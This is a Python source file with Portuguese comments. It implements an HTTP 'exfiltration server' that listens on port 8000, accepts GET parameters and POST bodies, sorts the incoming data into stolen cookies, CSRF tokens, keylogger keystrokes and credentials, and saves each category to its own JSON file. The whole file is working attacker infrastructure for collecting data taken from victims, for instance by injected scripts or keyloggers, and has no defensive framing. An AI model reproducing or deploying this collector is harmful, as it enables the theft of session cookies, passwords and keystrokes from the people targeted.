from http.server import HTTPServer, BaseHTTPRequestHandler
import logging
import json
import re
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# Função para identificar o tipo de dado
def identify_data(data):
    if isinstance(data, dict):
        # Checagem por chaves específicas em JSON
        if "cookies" in data:
            return "cookies"
        elif "csrf_token" in data:
            return "csrf_tokens"
        elif "key" in data:
            return "keylogger"
        elif "username" in data and "password" in data:
            return "credentials"
    else:
        # Checagem de padrões para strings
        if re.search(r"session=|cookie=", data):
            return "cookies"
        elif re.match(r'[a-zA-Z0-9]{32,}', data):
            return "csrf_tokens"
        elif re.search(r".+@.+\..+:.+", data):
            return "credentials"
    return "other"

# Função para salvar dados organizadamente
def save_data(data_type, data):
    filename = f"{data_type}_data.json"
    try:
        # Carregar dados existentes, se o arquivo já existir
        with open(filename, "r") as file:
            existing_data = json.load(file)
    except FileNotFoundError:
        existing_data = []

    # Adicionar os novos dados
    existing_data.append({"timestamp": datetime.now().isoformat(), "data": data})

    # Salvar novamente no arquivo
    with open(filename, "w") as file:
        json.dump(existing_data, file, indent=4)

# Classe do servidor
class ExfiltrationServer(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Evita logs de acessos padrão no terminal
        return

    def do_GET(self):
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
        logging.info(f"GET request received: {self.path}")

        # Extrair parâmetros da URL
        parsed_url = urlparse(self.path)
        params = parse_qs(parsed_url.query)

        # Processar os parâmetros e salvar os dados
        for key, value in params.items():
            data_type = identify_data({key: value[0]})
            save_data(data_type, {key: value[0]})
            logging.info(f"Captured {data_type}: {value[0]}")

        # Responder ao cliente
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data received!")

    def do_POST(self):
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

        # Extrair conteúdo do corpo da requisição
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        logging.info(f"Raw POST data received: {post_data}")

        # Identificar tipo de dado e salvar
        try:
            # Tentar interpretar como JSON
            data = json.loads(post_data)
            data_type = identify_data(data)
            save_data(data_type, data)
            logging.info(f"Captured {data_type}: {data}")
        except json.JSONDecodeError:
            # Caso não seja JSON, processa como form-urlencoded
            parsed_data = parse_qs(post_data)
            for key, value in parsed_data.items():
                data_type = identify_data({key: value[0]})
                save_data(data_type, {key: value[0]})
                logging.info(f"Captured {data_type} (form-encoded): {value[0]}")

        # Responder ao cliente
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data received!")

# Configurar o endereço e porta do servidor
server_address = ('0.0.0.0', 8000)
httpd = HTTPServer(server_address, ExfiltrationServer)

print("Servidor de Exfiltração rodando em http://0.0.0.0:8000")
httpd.serve_forever()
